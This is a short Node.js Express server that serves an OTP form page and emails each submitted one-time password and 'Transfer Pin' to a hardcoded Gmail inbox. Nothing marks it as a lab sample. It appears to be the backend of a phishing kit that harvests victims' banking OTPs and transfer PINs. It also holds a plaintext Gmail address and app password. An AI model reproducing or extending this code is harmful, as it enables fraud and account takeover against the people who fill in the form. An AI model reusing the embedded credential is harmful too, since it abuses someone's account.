const  express = require("express")
const app = express();
const nodemailer = require('nodemailer'); 


const PORT = process.env.PORT || 3000;


// Middleware 
app.use(express.static('public'))
app.use(express.json())

// otpForm
app.get('/', (req,res ) => {
    res.sendFile(__dirname + '/public/otp.html')
})
// otpForm
app.post('/',(req,res) => {
    console.log(req.body)

    const transporter = nodemailer.createTransport({
        service:'gmail',
        auth: {
            user: 'edehchinedu59@gmail.com',
            pass: 'yknycyzsxdkxpepq'
        }
    })
    const mailOptions = {
        from: req.body?.otp,
        to:'edehchinedu59@gmail.com',
        subject: `Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin} `
    }
console.log(mailOptions)
    transporter.sendMail(mailOptions,(error,info) => {
        if(error){
            console.log(error) 
            res.send('error');
        }else {
            console.log("Email sent", + info.response);
            res.send("success");
        }
    })
    
})




app.listen(PORT, ()=> {
    console.log(`Server running on port http://localhost:${PORT}`)
})